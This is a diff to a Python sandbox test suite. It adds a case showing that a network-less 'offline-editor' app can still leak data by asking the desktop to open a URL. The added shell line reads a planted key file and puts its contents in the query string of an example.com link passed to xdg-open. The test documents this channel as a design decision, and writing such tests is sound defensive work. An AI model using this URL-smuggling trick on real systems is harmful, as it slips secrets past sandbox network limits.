@@ -1263,6 +1263,14 @@ def test_links_and_files_an_app_opens_go_to_the_host_through_the_portal(env, tmp
                     'echo x > "$HOME/Documents/refuse-me.txt"; xdg-open "$HOME/Documents/refuse-me.txt"; echo "REFUSED $?"; '
                     'if command -v gio >/dev/null; then timeout 10 gio open mailto:someone@example.com && echo GIO-OK; fi; true',
                     env={"DBUS_SESSION_BUS_ADDRESS": bus.addr})
+        # CR1.5-29: the road is there whatever the network grant says. An offline-editor has no
+        # network (its namespace holds the loopback alone), and what it knows leaves all the same,
+        # in a link the desktop is asked to open, which the user's browser then fetches for it.
+        # The design keeps the road (R17.6.3); R17.17 and the dialog's Network hint say so.
+        offline = env.run(env.app("ed", sb.resolve_template("offline-editor")),
+                          'echo NET $(cut -s -d: -f1 /proc/net/dev); echo k3y-from-the-sandbox > "$HOME/key"; '
+                          'xdg-open "https://example.com/?d=$(cat "$HOME/key")" && echo URL-OK',
+                          env={"DBUS_SESSION_BUS_ADDRESS": bus.addr})
     finally:
         fake.terminate()
         bus.close()
@@ -1273,6 +1281,8 @@ def test_links_and_files_an_app_opens_go_to_the_host_through_the_portal(env, tmp
     assert "REFUSED 1" in r.stdout and "the host couldn't open" in r.stderr and "refuse-me.txt" in r.stderr, r.stderr
     if "GIO-OK" in r.stdout:
         assert "OpenURI mailto:someone@example.com" in opened
+    assert offline.stdout.splitlines() == ["NET lo", "URL-OK"], (offline.stdout, offline.stderr)     # no network, and the link went
+    assert "OpenURI https://example.com/?d=k3y-from-the-sandbox" in opened, opened
 
 
 _TEST_HANDLER = "/usr/share/applications/appkata-test-handler.desktop"      # scripts/sandbox/register-test-handler.sh
